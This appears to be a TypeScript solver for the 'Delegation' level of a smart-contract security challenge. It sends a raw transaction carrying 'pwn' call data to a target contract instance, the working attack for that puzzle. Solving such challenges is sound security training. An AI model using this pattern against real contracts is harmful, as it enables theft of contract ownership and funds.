import { EthereumClient } from '../ethereum/ethereum-client';
import { Attacker } from './attacker-provider';

export const DELEGATION_LEVEL_NAME = "Delegation"

export const delegationAttacker = (): Attacker => {
    return {
        attack: async (ethereum: EthereumClient, instanceAddress: string) => {
            const callData = ethereum.createCallData('pwn');
            const attackTx = await ethereum.sendRawTx({to: instanceAddress, data: callData, gasLimit: 50000});
            await attackTx.wait();
        }
    }
}